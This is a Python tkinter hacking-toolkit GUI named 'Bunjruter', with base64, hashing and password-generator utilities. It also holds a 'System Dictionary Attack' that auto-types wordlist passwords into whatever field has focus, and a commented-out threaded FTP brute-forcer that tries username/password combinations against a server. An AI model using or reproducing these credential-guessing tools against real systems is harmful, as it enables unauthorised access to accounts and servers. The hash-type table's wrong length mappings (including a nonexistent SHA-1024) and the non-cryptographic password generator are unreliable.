import tkinter as tk
import random
import string
import pyautogui
import time
import os
import ftplib
from tkinter import filedialog, simpledialog
import threading
import hashlib as hsh
from PIL import Image, ImageTk
import base64 as b64


def main():
    global window

    window = tk.Tk()
    window.configure(bg="white")
    window.title("Bunjruter")
    window.geometry("290x350+800+300")
    window.resizable(False, False)
    window.iconbitmap(bunjruter_main_icon_file)
    background_image = Image.open("wallpapers/bunjruter_main.jpg")
    background_photo = ImageTk.PhotoImage(background_image)
    background_label = tk.Label(window, image=background_photo)
    background_label.place(relwidth=1, relheight=1)

    # Info Button
    infoButton = tk.Button(window, text="Info",font="Baskerville 8",width=8,command=info_page)
    infoButton.place(x = (290 - infoButton.winfo_reqwidth()) / 2, y = 300)

    # Hash Generator Button
    hashGeneratorButton = tk.Button(window, text="Hash Generator", font="Baskerville 8", command=hash_generator_window)
    hashGeneratorButton.place(x=70, y=20)

    # Hash Type Button
    hashTypeButton = tk.Button(window, text="Hash Type", font="Baskerville 8", command=hash_type_scanner_window)
    hashTypeButton.place(x=148, y=50)

    # Brute Force Button
    BruteForceButton = tk.Button(window, text="System Dictionary Attack", font="Baskerville 8", command=dictionary_attack_window)
    BruteForceButton.place(x=15, y=50)

    # Password Generator Button
    passGenButton = tk.Button(window, text="Password Generator", font="Baskerville 8", command=password_generator)
    passGenButton.place(x=160, y=20)

    # Base 64 Button
    base64Button = tk.Button(window, text="Base 64", font="Baskerville 8", command=open_base64_window)
    base64Button.place(x=15, y=20)

    # Ftp Button
    """
    ftp_login_start_button = tk.Button(window, width=8, font="Baskerville 8", text="FTP",command=ftp_page)
    ftp_login_start_button.place(x=213, y=50)
    """

    # Credit
    credit_label = tk.Label(window, text="Written by TheBunjo.", font="Baskerville 7", bg="white")
    credit_label.place(x= (290 - credit_label.winfo_reqwidth()) / 2, y = 330)

    window.mainloop()



# Ftp Page
"""def ftp_page():
    def connect_ftp():
        server = ftp_server_entry.get()
        usernames_path = user_listbox_path.get()
        passwords_path = password_listbox_path.get()

        def ftp_connection_task(username, password):
            try:
                ftp = ftplib.FTP(server)
                ftp.login(username, password)
                ftp.cwd("/")  # You can change the working directory here
                ftp_files = ftp.nlst()  # List files in the current directory
                ftp.quit()

                result_text = f"User: {username}\n"
                result_text += f"Password: {password}\n"
                result_text += "\n".join(ftp_files)

                ftp_result_text.delete(1.0, tk.END)
                ftp_result_text.insert(tk.END, result_text)
            except Exception as e:
                ftp_result_text.delete(1.0, tk.END)
                ftp_result_text.insert(tk.END, f"Error: {str(e)}")

        def read_file_lines(file_path):
            lines = []
            with open(file_path, 'r') as file:
                lines = file.read().splitlines()
            return lines

        ftp_result_text.delete(1.0, tk.END)  # Clear previous results
        usernames = read_file_lines(usernames_path)
        passwords = read_file_lines(passwords_path)
        for username in usernames:
            for password in passwords:
                thread = threading.Thread(target=ftp_connection_task, args=(username, password))
                thread.start()

    def browse_for_credentials():
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            user_listbox_path.set(file_path)

    def browse_for_passwords():
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            password_listbox_path.set(file_path)

    ftp_pg = tk.Toplevel(window)
    ftp_pg.geometry("285x420+1480+200")
    ftp_pg.title("Ftp Login")
    ftp_pg.resizable(False, False)
    # ftp_pg.iconbitmap(bunjruter_ftp_login_icon_file)  # You can add the icon file path here

    ftp_server_label = tk.Label(ftp_pg, text="FTP Server:", font="Baskerville 8")
    ftp_server_label.place(x=10, y=20)
    ftp_server_entry = tk.Entry(ftp_pg, font="Baskerville 8", width=31)
    ftp_server_entry.place(x=80, y=22)

    user_label = tk.Label(ftp_pg, text="Username List:", font="Baskerville 8")
    user_label.place(x=10, y=60)
    user_listbox = tk.Listbox(ftp_pg, font="Baskerville 8", height=9, width=20)
    user_listbox.place(x=10, y=90)

    user_listbox_path = tk.StringVar()
    password_listbox_path = tk.StringVar()

    user_browse_button = tk.Button(ftp_pg, text="Browse Users", font="Baskerville 8", command=browse_for_credentials)
    user_browse_button.place(x=33, y=240)

    password_label = tk.Label(ftp_pg, text="Password List:", font="Baskerville 8")
    password_label.place(x=150, y=60)
    password_listbox = tk.Listbox(ftp_pg, font="Baskerville 8", height=9, width=20)
    password_listbox.place(x=150, y=90)

    password_browse_button = tk.Button(ftp_pg, text="Browse Passwords", font="Baskerville 8",
                                       command=browse_for_passwords)
    password_browse_button.place(x=160, y=240)

    connect_button = tk.Button(ftp_pg, text="Start Attack", font="Baskerville 8", command=connect_ftp)
    connect_button.place(x=(285 - connect_button.winfo_reqwidth()) / 2, y=385)

    ftp_result_label = tk.Label(ftp_pg, font="Baskerville 8", text="Output:")
    ftp_result_label.place(x=(285 - ftp_result_label.winfo_reqwidth()) / 2, y=275)

    ftp_result_text = tk.Text(ftp_pg, font="Baskerville 8", wrap=tk.WORD, height=5, width=43)
    ftp_result_text.place(x=10, y=300)
"""

# Info Page
def info_page():
    info_window = tk.Toplevel(window)
    info_window.title("Info")
    info_window.geometry("280x150+200+200")
    info_window.resizable(False, False)
    info_window.iconbitmap(bunjruter_info_icon_file)

    info_text = "This project is made for educational purposes."
    info_text2 = "New features will be added in renewed versions."

    info_dict_attack_text = "System Dictionary Attack"
    info_dict_attack_text2 = "reads the entered password list,"
    info_dict_attack_text3 = "prints it one by one at the entered speed"
    info_dict_attack_text4 = "from the keyboard and presses the enter key."

    combined_info_text = (
        info_dict_attack_text
        + "\n"
        + info_dict_attack_text2
        + "\n"
        + info_dict_attack_text3
        + "\n"
        + info_dict_attack_text4
        + "\n"
        + "\n"
        + info_text
        + "\n"
        + info_text2
    )

    # Yeni bir metin alanı ekleyerek metinleri kaydırma çubuğu içine yerleştirme
    info_textbox = tk.Text(
        info_window,
        font="Baskerville 8",
        wrap=tk.WORD,
        width=49,
        height=14,
        bg="white",
    )
    info_textbox.pack(padx=10, pady=10)
    info_textbox.insert(tk.END, combined_info_text)

# Dictionary Attack Stage
def dictionary_attack_window():
    default_wordlist_path = r'wordlists/default_wordlist.txt'

    dict_wind = tk.Toplevel()
    dict_wind.geometry("290x430+460+500")
    dict_wind.title("Dictionary Attack")
    dict_wind.resizable(False, False)
    dict_wind.iconbitmap(bunjruter_dictionary_attack_icon_file)

    wordlist_text = tk.Text(dict_wind, font="Baskerville 8", height=25, width=41)
    wordlist_text.place(x=20, y=55)

    def load_default_wordlist():
        nonlocal wordlist_content
        wordlist_content = ""
        if os.path.exists(default_wordlist_path):
            with open(default_wordlist_path, 'r') as default_file:
                wordlist_content = default_file.read()
                wordlist_text.delete(1.0, tk.END)
                wordlist_text.insert(tk.END, wordlist_content)

    def load_wordlist(wordlist_path):
        wordlist_content = ""
        if os.path.exists(wordlist_path):
            with open(wordlist_path, 'r') as wordlist_file:
                wordlist_content = wordlist_file.read()
        return wordlist_content

    wordlist_content = load_wordlist(default_wordlist_path)

    def select_wordlist():
        nonlocal wordlist_content
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            wordlist_content = load_wordlist(file_path)
            wordlist_text.delete(1.0, tk.END)
            wordlist_text.insert(tk.END, wordlist_content)

    def start_attack():
        nonlocal wordlist_content
        wait_time = float(speed_label_entry.get())

        def attack_thread():
            for line in wordlist_content.split('\n'):
                pyautogui.write(line.strip())
                pyautogui.press('enter')
                time.sleep(wait_time)

        attack_thread = threading.Thread(target=attack_thread)
        attack_thread.start()

    select_button = tk.Button(dict_wind, text="Select Wordlist", font="Baskerville 8", command=select_wordlist)
    select_button.place(x=20, y=20)

    speed_label = tk.Label(dict_wind, text="Wait:", font="Baskerville 8")
    speed_label.place(x=155, y=23)

    start_button = tk.Button(dict_wind, text="Attack", font="Baskerville 8", command=start_attack)
    start_button.place(x=110, y=20)

    select_button = tk.Button(dict_wind, text="Select Wordlist", font="Baskerville 8", command=select_wordlist)
    select_button.place(x=20, y=20)

    speed_label_entry = tk.Entry(dict_wind, font="Baskerville 8", width=3)
    speed_label_entry.place(x=188, y=24)

    start_button = tk.Button(dict_wind, text="Attack", font="Baskerville 8", command=start_attack)
    start_button.place(x=110, y=20)

    default_wordlist_button = tk.Button(dict_wind, text="Default",font="Baskerville 8",command=load_default_wordlist)
    default_wordlist_button.place(x = 225, y = 20)

# Password Generator Stage
def password_generator():
    def generate_password():
        password_length = int(password_length_var.get())
        if password_length > 64:
            password_length = 64  # Maximum length is 64 characters

        use_special_chars = special_chars_var.get()
        use_numbers = numbers_var.get()
        use_letters = letters_var.get()

        chars = ""
        if use_special_chars:
            chars += string.punctuation
        if use_numbers:
            chars += string.digits
        if use_letters:
            chars += string.ascii_letters

        if not chars:
            password_result.delete(0, tk.END)
            password_result.insert(0, "Select at least one option.")
            return

        password = "".join(random.choice(chars) for i in range(password_length))
        password_result.delete(0, tk.END)
        password_result.insert(0, password)

    pass_generator = tk.Toplevel(window)
    pass_generator.geometry("280x180+1150+200")
    pass_generator.title("Password Generator")
    pass_generator.iconbitmap(bunjruter_password_generator_icon_file)
    pass_generator.resizable(False, False)

    password_length_label = tk.Label(pass_generator, text="Password Length:", font="Baskerville 8")
    password_length_label.place(x=10, y=10)

    password_length_var = tk.StringVar(pass_generator)
    password_length_var.set("8")
    password_length_entry = tk.Entry(pass_generator, font="Baskerville 8", textvariable=password_length_var)
    password_length_entry.place(x=110, y=12)

    special_chars_var = tk.BooleanVar()
    special_chars_checkbox = tk.Checkbutton(pass_generator, text="Special Characters", font="Baskerville 8", variable=special_chars_var)
    special_chars_checkbox.place(x=10, y=40)

    numbers_var = tk.BooleanVar()
    numbers_checkbox = tk.Checkbutton(pass_generator, text="Numbers", font="Baskerville 8", variable=numbers_var)
    numbers_checkbox.place(x=130, y=40)

    letters_var = tk.BooleanVar()
    letters_checkbox = tk.Checkbutton(pass_generator, text="Letters", font="Baskerville 8", variable=letters_var)
    letters_checkbox.place(x=210, y=40)
    # Generate Button
    generate_button = tk.Button(pass_generator, text="Generate Password", font="Baskerville 9", command=generate_password)
    generate_button.place(x=75, y=140)

    password_result_label = tk.Label(pass_generator, text="Generated Password:", font="Baskerville 8")
    password_result_label.place(x=10, y=85)

    password_result = tk.Entry(pass_generator, font="Baskerville 8")
    password_result.place(x=130, y=85)

    warning_label_64_character = tk.Label(pass_generator, font="Baskerville 8",text="WARNING: password characters must not exceed 64.",fg="red")
    warning_label_64_character.place(x=10, y=113)

# Base 64 Stage
def open_base64_window():
    def encrypt_text():
        b64_encrypt_input_text = encrypt_entry.get()
        b64_encoded_text = b64.b64encode(b64_encrypt_input_text.encode()).decode()
        encrypt_result.delete(0, tk.END)
        encrypt_result.insert(0, b64_encoded_text)

    def decrpyt_text():
        b64_decrypt_input_text = decrypt_entry.get()
        b64_decrypted_text = b64.b64decode(b64_decrypt_input_text.encode().decode())
        decrypt_result.delete(0, tk.END)
        decrypt_result.insert(0, b64_decrypted_text)

    base64_window = tk.Toplevel(window)
    base64_window.title("Base 64")
    base64_window.geometry("240x230+500+200")
    base64_window.resizable(False, False)
    base64_window.iconbitmap(bunjruter_base64_icon_file)

    encrypt_label = tk.Label(base64_window, text="Encrypt :", font="Baskerville 8")
    encrypt_label.place(x=20, y=20)

    encrypt_entry = tk.Entry(base64_window, font="Baskerville 8")
    encrypt_entry.place(x=90, y=20)

    encrypt_button = tk.Button(base64_window, text="Encrypt", command=encrypt_text)
    encrypt_button.place(x=90, y=80)

    encrypt_result_label = tk.Label(base64_window, text="Result :", font="Baskerville 8")
    encrypt_result_label.place(x=20, y=50)

    encrypt_result = tk.Entry(base64_window, font="Baskerville 8")
    encrypt_result.place(x=90, y=50)

    decrypt_label = tk.Label(base64_window, text="Decrypt :", font="Baskerville 8")
    decrypt_label.place(x=20, y=120)

    decrypt_entry = tk.Entry(base64_window, font="Baskerville 8")
    decrypt_entry.place(x=90, y=120)

    decrypt_result_label = tk.Label(base64_window, font="Baskerville 8", text="Result: ")
    decrypt_result_label.place(x=20, y=150)

    decrypt_result = tk.Entry(base64_window, font="Baskerville 8")
    decrypt_result.place(x=90, y=150)

    decrypt_button = tk.Button(base64_window, text="Decrypt", command=decrpyt_text)
    decrypt_button.place(x=90, y=190)

# Hash Generator Space

def hash_generator_window():
    def generate_hash(*args):
        text_to_hash = enter_text_crypt_hash_entry.get()
        selected_hash_type = hash_type_var.get()

        if not text_to_hash:
            generated_hash_result.delete(0, tk.END)
            generated_hash_result.insert(0, "Empty.")
            return

        if selected_hash_type == "MD5":
            hash_obj = hsh.md5(text_to_hash.encode()).hexdigest()
        elif selected_hash_type == "SHA-1":
            hash_obj = hsh.sha1(text_to_hash.encode()).hexdigest()
        elif selected_hash_type == "SHA-256":
            hash_obj = hsh.sha256(text_to_hash.encode()).hexdigest()
        elif selected_hash_type == "SHA-512":
            hash_obj = hsh.sha512(text_to_hash.encode()).hexdigest()

        generated_hash_result.delete(0, tk.END)
        generated_hash_result.insert(0, hash_obj)

    hash_gen = tk.Toplevel()
    hash_gen.geometry("270x125+800+100")
    hash_gen.title("Hash Oluşturucu")
    hash_gen.resizable(False, False)

    enter_text_crypt_hash_label = tk.Label(hash_gen, text="Metin Girin:", font="Baskerville 8")
    enter_text_crypt_hash_label.place(x=10, y=10)

    enter_text_crypt_hash_entry = tk.Entry(hash_gen, font="Baskerville 8")
    enter_text_crypt_hash_entry.place(x=110, y=15)

    hash_type_label = tk.Label(hash_gen, text="Hash Türü Seçin:", font="Baskerville 8")
    hash_type_label.place(x=10, y=70)

    hash_type_var = tk.StringVar(hash_gen)
    hash_type_var.set("MD5")

    hash_type_dropdown = tk.OptionMenu(hash_gen, hash_type_var, "MD5", "SHA-1", "SHA-256", "SHA-512")
    hash_type_dropdown.place(x=110, y=65)

    enter_text_crypt_hash_entry.bind("<KeyRelease>", generate_hash)

    generated_hash_label = tk.Label(hash_gen, text="Oluşturulan Hash:", font="Baskerville 8")
    generated_hash_label.place(x=10, y=40)

    generated_hash_result = tk.Entry(hash_gen, font="Baskerville 8")
    generated_hash_result.place(x=110, y=40)

    hash_type_var.trace("w", generate_hash)


# Hash Type Stage

def hash_type_scanner_window():
    def scan_hash_type():
        entered_hash = hash_input_entry.get().lower()

        hash_type_result.delete(0, tk.END)

        hash_algorithms = {
            32: "MD5",
            40: "SHA-1",
            64: "SHA-256",
            128: "SHA-512",
            256: "SHA-224",
            384: "SHA-384",
            512: "SHA-512",
            1024: "SHA-1024"
            # Add more hash lengths and their corresponding algorithms here
        }

        hash_length = len(entered_hash)

        if hash_length in hash_algorithms and all(c in string.hexdigits for c in entered_hash):
            hash_type_result.insert(0, f"Possibly a {hash_algorithms[hash_length]} hash.")
        else:
            hash_type_result.insert(0, "Unknown")

    hash_type_window = tk.Toplevel(window)
    hash_type_window.title("Hash Type")
    hash_type_window.geometry("290x130+1150+500")
    hash_type_window.resizable(False, False)
    hash_type_window.iconbitmap(bunjruter_hash_type_icon_file)

    hash_type_label = tk.Label(hash_type_window, text="Enter Hash :", font="Baskerville 8")
    hash_type_label.place(x=20, y=10)

    hash_input_entry = tk.Entry(hash_type_window, font="Baskerville 9")
    hash_input_entry.place(x=100, y=11.5)

    hash_type_result_label = tk.Label(hash_type_window, font="Baskerville 8", text="Hash Type :")
    hash_type_result_label.place(x=20, y=40)

    hash_type_result = tk.Entry(hash_type_window, font="Baskerville 9")
    hash_type_result.place(x=100, y=40)

    hash_type_scan_button = tk.Button(hash_type_window, font="Baskerville 8", text="Scan Hash Type",command=scan_hash_type)
    hash_type_scan_button.place(x=100, y=75)

# Icon
bunjruter_main_icon_file = r'icons/bunjruter_main.ico'
bunjruter_base64_icon_file = r'icons/bunjruter_base64.ico'
bunjruter_hash_type_icon_file = r'icons/hash_type.ico'
bunjruter_hash_generator_icon_file = r'icons/hash_generator.ico'
bunjruter_password_generator_icon_file = r'icons/password_generator.ico'
bunjruter_dictionary_attack_icon_file = r'icons/dictionary_attack.ico'
bunjruter_info_icon_file = r'icons/info.ico'
bunjruter_ftp_login_icon_file = r'icons/ftp_login.ico'

if __name__ == "__main__":
    main()
